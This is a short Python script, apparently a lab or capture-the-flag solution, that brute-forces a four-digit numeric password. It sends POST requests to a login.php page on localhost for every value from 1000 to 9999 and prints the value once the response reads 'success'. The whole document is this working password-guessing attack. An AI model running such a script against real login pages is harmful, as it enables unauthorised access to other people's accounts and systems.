import requests

pw = -1

for i in range(1000, 10000):
    r = requests.post("http://localhost/login.php?password=" + str(i))
    if r.text.lower() == "success":
        pw = i
        break

print(str(pw))